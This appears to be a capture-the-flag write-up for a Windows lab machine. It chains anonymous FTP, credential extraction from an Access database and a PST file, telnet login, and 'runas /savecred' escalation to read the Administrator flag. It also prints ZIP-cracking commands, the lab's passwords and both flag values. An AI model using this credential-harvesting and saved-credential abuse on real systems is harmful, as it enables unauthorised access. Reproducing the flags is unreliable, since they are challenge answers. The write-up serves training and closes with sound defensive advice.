# HTB - ACCESS  - 10.129.244.44



### Machine Info

* **Difficulty:** Easy
* **OS:** Windows (Windows 7/Server 2008 R2)
* **IP:** 10.129.244.44
* **Key Skills:** FTP enumeration, Microsoft Access database analysis, PST file extraction, saved credentials exploitation

### Overview

Access is an easy Windows box that focuses on credential hunting and saved credential exploitation. The attack path involves accessing anonymous FTP to download files, extracting credentials from a Microsoft Access database, using those credentials to decrypt a password-protected ZIP file containing Outlook PST data, finding telnet credentials in the email, and finally exploiting Windows saved credentials (runas /savecred) to gain administrator access. It's a straightforward box teaching Windows credential management weaknesses.

**Key Concepts:**

* Anonymous FTP enumeration
* Microsoft Access database (.mdb) extraction
* Password-protected ZIP cracking
* Outlook PST file analysis
* Windows Telnet service
* Saved credentials exploitation (runas /savecred)

**Common Ports:**

* **21/TCP** - FTP (Microsoft ftpd - Anonymous access)
* **23/TCP** - Telnet (Microsoft Windows XP telnetd)
* **80/TCP** - HTTP (Microsoft IIS 7.5)

***

### Exploitation Workflow Summary

1. **Initial Enumeration** ├─ Nmap reveals FTP, Telnet, HTTP ├─ Anonymous FTP access available └─ Download accessible files
2. **Credential Discovery** ├─ Extract Microsoft Access database from FTP ├─ Analyze database tables for credentials ├─ Find engineer password in auth\_user table └─ Use password to decrypt ZIP archive
3. **Email Analysis** ├─ Extract PST file from decrypted ZIP ├─ Read Outlook emails with readpst ├─ Find security account credentials └─ Build credential list
4. **Initial Access** ├─ Connect via Telnet as security user ├─ Enumerate user environment ├─ Discover saved administrator credentials └─ Capture user flag
5. **Privilege Escalation** ├─ Find .lnk file with runas /savecred ├─ Verify saved credentials with cmdkey ├─ Execute commands as Administrator └─ Capture root flag

***

### Initial Enumeration

#### Port Scanning

Let's see what's running:

```bash
nmap -Pn -sCV -T5 10.129.244.44 -oN nmap.tcp
```

**Results:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd (Anonymous login allowed)
23/tcp open  telnet  Microsoft Windows XP telnetd
80/tcp open  http    Microsoft IIS httpd 7.5
```

**What we learned:**

* FTP with anonymous access enabled
* Telnet service (unusual for modern systems)
* IIS web server
* Windows system (likely Windows 7 or Server 2008)

**Key detail:**

```
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

Anonymous FTP is our entry point!

***

### FTP Enumeration

#### Anonymous Access

**Connect to FTP:**

```bash
ftp 10.129.244.44
Name: anonymous
Password: [press Enter]
```

**Success!** We're logged in anonymously.

#### Discovering Files

**List directories:**

```
ftp> ls
227 Entering Passive Mode
150 Opening ASCII mode data connection.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
```

**Two directories found:**

* Backups
* Engineer

#### Downloading Files

**Important FTP configuration:**

The server may have PASV issues. If downloads fail, disable passive mode:

```
ftp> passive
Passive mode off

ftp> binary
200 Type set to I

ftp> cd Backups
ftp> get backup.mdb

ftp> cd ../Engineer
ftp> get "Access Control.zip"
```

**Files obtained:**

1. `backup.mdb` - Microsoft Access database
2. `Access Control.zip` - Password-protected archive

***

### Microsoft Access Database Analysis

#### What is an .mdb file?

**Microsoft Access Database:**

* Legacy database format from Microsoft Office
* Often contains user data, configurations, credentials
* Can be read on Linux with mdbtools

#### Installing Tools

```bash
sudo apt install mdbtools
```

#### Exploring the Database

**List all tables:**

```bash
mdb-tables backup.mdb
```

**Output shows 140+ tables including:**

* `auth_user` ⭐ (System authentication)
* `USERINFO` ⭐ (Employee information)
* `personnel_*` (HR data)
* `acc_*` (Access control systems)

#### Extracting Critical Tables

**Export auth\_user table:**

```bash
mdb-export backup.mdb auth_user
```

**Results:**

| ID | Username      | Password              | Role |
| -- | ------------- | --------------------- | ---- |
| 25 | admin         | admin                 | 26   |
| 27 | engineer      | **access4u@security** | 26   |
| 28 | backup\_admin | admin                 | 26   |

**Key finding:**

```
engineer:access4u@security
```

**Export USERINFO table:**

```bash
mdb-export backup.mdb USERINFO
```

**Employee PINs found:**

| ID | Name          | PIN    |
| -- | ------------- | ------ |
| 1  | John Carter   | 020481 |
| 2  | Mark Smith    | 010101 |
| 3  | Sunita Rahman | 000000 |
| 4  | Mary Jones    | 666666 |
| 5  | Monica Nunes  | 123321 |

***

### ZIP Archive Extraction

#### Attempting Extraction

**Try to unzip:**

```bash
unzip "Access Control.zip"
```

**Error:**

```
Archive: Access Control.zip
   creating: Access Control/
[Access Control.zip] Access Control/Access Control.pst password:
```

Password-protected! But we have credentials from the database.

#### Using Found Password

**Try the engineer password:**

```bash
unzip -P "access4u@security" "Access Control.zip"
```

**Or with 7zip:**

```bash
7z x -p"access4u@security" "Access Control.zip"
```

**Success!** Archive decrypted.

**Extracted file:**

```
Access Control/Access Control.pst
```

**What is a PST file?**

* Outlook Personal Storage Table
* Contains emails, contacts, calendar entries
* May have sensitive information in emails

***

### PST File Analysis

#### Reading PST Files on Linux

**Install readpst:**

```bash
sudo apt install pst-utils
```

#### Extracting Emails

```bash
readpst "Access Control.pst"
```

**Output:**

```
Opening PST file and indexes...
Processing Folder "Deleted Items"
Processing Folder "Inbox"
Processing Folder "Outbox"
Processing Folder "Sent Items"
        "Access Control" - 1 items done, 0 items skipped.
```

**Creates file:**

```
Access Control.mbox
```

#### Reading the Email

```bash
cat "Access Control.mbox"
```

**Email content:**

```
From: john@megacorp.com
To: security@accesscontrolsystems.com
Subject: MegaCorp Access Control System "security" account
Date: Thu, 23 Aug 2018 23:44:07 +0000

Hi there,

The password for the "security" account has been changed to 4Cc3ssC0ntr0ller.
Please ensure this is passed on to your engineers.

Regards,
John
```

**Critical credential found:**

```
security:4Cc3ssC0ntr0ller
```

***

### Initial Access - Telnet

#### Understanding Telnet

**What is Telnet?**

* Unencrypted remote access protocol
* Precursor to SSH
* Rarely used today due to security issues
* Sends credentials in plaintext

**Why it's here:** This is an old Windows system (likely Windows 7 or Server 2008 R2), where Telnet was still common.

#### Connecting via Telnet

```bash
telnet 10.129.244.44
```

**Login prompt:**

```
Welcome to Microsoft Telnet Service

login: security
password: 4Cc3ssC0ntr0ller
```

**Success!**

```
*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>
```

**We're in as the security user!**

#### User Flag

```cmd
C:\Users\security\Desktop> type user.txt
79126d431f8b39e63edc89a185fbddfc
```

***

### Privilege Escalation - Saved Credentials

#### Enumeration

**Check Desktop:**

```cmd
C:\Users\security\Desktop> cd C:\Users\Public\Desktop
C:\Users\Public\Desktop> dir
```

**Found interesting file:**

```
ZKAccess3.5 Security System.lnk
```

#### Analyzing the Shortcut

**View contents:**

```cmd
type "ZKAccess3.5 Security System.lnk"
```

**Key portion:**

```
runas.exe
/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
```

**What this reveals:**

* The shortcut uses `runas` command
* It's configured to run as `Administrator`
* The `/savecred` flag is used
* Credentials are saved in Windows Credential Manager

#### Understanding /savecred

**What is /savecred?** When a user runs `runas /savecred`, Windows saves the credentials in Credential Manager. Future executions with `/savecred` don't require entering the password again.

**Security risk:** Any user who finds a saved credential can execute commands as that user without knowing the actual password.

#### Verifying Saved Credentials

**Check Windows Credential Manager:**

```cmd
cmdkey /list
```

**Output:**

```
Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

**Perfect!** Administrator credentials are saved and accessible.

***

### Exploitation

#### Command Execution as Administrator

**The challenge:**

* We can run commands as Administrator
* But we only have a Telnet shell (no GUI)
* We need to extract the flag

**Solution approach:** Use `runas /savecred` to execute a command that writes the flag to a file we can read.

#### Extracting Root Flag

**Command:**

```cmd
runas /env /noprofile /savecred /user:ACCESS\Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\Public\Desktop\root.txt"
```

**Parameters explained:**

* `/env` - Use current environment
* `/noprofile` - Don't load user profile (faster)
* `/savecred` - Use saved credentials
* `/user:ACCESS\Administrator` - Run as this user
* `cmd.exe /c` - Execute command and exit
* `type C:\Users\Administrator\Desktop\root.txt` - Read the flag
* `> C:\Users\Public\Desktop\root.txt` - Write to accessible location

**Execute the command:**

```cmd
C:\Users\Public\Desktop> runas /env /noprofile /savecred /user:ACCESS\Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > root.txt"
```

**Read the flag:**

```cmd
C:\Users\Public\Desktop> type root.txt
2b3ebe3d38fa0115f72db7ea44fcc966
```

**Root flag captured!**

#### Alternative: Getting Full Admin Shell

**For interactive access:**

```cmd
runas /env /noprofile /savecred /user:ACCESS\Administrator "cmd.exe"
```

This would spawn a new command prompt as Administrator, but it won't display in Telnet. Better to use output redirection as shown above.

***

### Quick Reference

#### FTP Enumeration

```bash
# Connect anonymously
ftp TARGET
Name: anonymous
Password: [Enter]

# Disable passive mode if needed
ftp> passive

# Set binary transfer mode
ftp> binary

# Download files
ftp> get filename
```

#### Microsoft Access Database

```bash
# Install tools
sudo apt install mdbtools

# List tables
mdb-tables database.mdb

# Export specific table
mdb-export database.mdb table_name

# Export all tables
for table in $(mdb-tables database.mdb); do
    mdb-export database.mdb "$table" > "$table.csv"
done
```

#### ZIP File Operations

```bash
# Unzip with password
unzip -P "password" file.zip

# Using 7zip
7z x -p"password" file.zip

# Crack ZIP password (if needed)
zip2john file.zip > hash.txt
john hash.txt --wordlist=rockyou.txt
```

#### PST File Analysis

```bash
# Install tools
sudo apt install pst-utils

# Extract emails
readpst file.pst

# View extracted mbox
cat file.mbox
```

#### Windows Saved Credentials

```cmd
# List saved credentials
cmdkey /list

# Run command as another user
runas /savecred /user:DOMAIN\User "command"

# Execute and redirect output
runas /savecred /user:DOMAIN\User "cmd.exe /c command > output.txt"
```

***

### Troubleshooting

#### FTP PASV Mode Issues

**Problem:** Can't download files, "PASV failed" error

**Solution:**

```
ftp> passive
Passive mode off

ftp> binary
ftp> get filename
```

**Why it works:** Some FTP servers have passive mode misconfigured. Disabling it forces active mode.

#### MDB File Won't Open

**Problem:** mdb-tables or mdb-export fails

**Solution:**

```bash
# Check file integrity
file backup.mdb

# Try different mdbtools version
sudo apt install mdbtools-dev

# Use alternative: mdb-viewer (GUI)
sudo apt install mdbtools-gmdb
gmdb2 backup.mdb
```

#### ZIP Password Not Working

**Problem:** Extracted password doesn't decrypt ZIP

**Solution:**

```bash
# Try variations
unzip -P "access4u@security" file.zip
unzip -P 'access4u@security' file.zip

# Check for special characters
# Try URL encoding: @ becomes %40
unzip -P "access4u%40security" file.zip

# Brute force with known passwords
fcrackzip -u -D -p passwords.txt file.zip
```

#### PST File Extraction Fails

**Problem:** readpst crashes or shows errors

**Solution:**

```bash
# Use verbose mode
readpst -v file.pst

# Try older format
readpst -o output_dir file.pst

# Use alternative: libpst
apt install libpst-dev
lspst file.pst
```

#### Runas Command Not Executing

**Problem:** Command runs but no output

**Solution:**

```cmd
# Ensure output redirection works
runas /savecred /user:Admin "cmd /c whoami > test.txt"
type test.txt

# Check permissions on output directory
icacls C:\Users\Public\Desktop

# Use absolute paths
runas /savecred /user:ACCESS\Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\temp\flag.txt"
```

***

### Key Takeaways

**What we learned:**

1. **Anonymous FTP** - Always check for anonymous access; it often contains database backups and sensitive files
2. **Microsoft Access databases** - Legacy .mdb files frequently contain plaintext credentials in auth tables
3. **Password reuse** - Credentials found in one system component (database) often work elsewhere (ZIP files, user accounts)
4. **PST file analysis** - Outlook archives contain sensitive communications including password changes and system credentials
5. **Saved credentials exploit** - Windows /savecred feature is a major privilege escalation vector when misconfigured
6. **Credential chain** - We chained multiple credential finds: DB → ZIP → PST → Telnet → Saved creds → Admin

**Defense recommendations:**

* Disable anonymous FTP or restrict accessible directories
* Never store plaintext credentials in databases
* Use strong, unique passwords for archive encryption
* Disable Telnet; use SSH instead
* Never use /savecred on shared systems
* Regularly audit Windows Credential Manager
* Implement least privilege access controls
* Encrypt sensitive email communications
* Monitor for credential extraction attempts
* Use modern authentication methods (Kerberos, certificates)

***

### Related Topics

* \[\[Windows Credential Manager]]
* \[\[FTP Enumeration]]
* \[\[Microsoft Access Databases]]
* \[\[PST File Forensics]]
* \[\[Runas Exploitation]]
* \[\[Windows Privilege Escalation]]

***
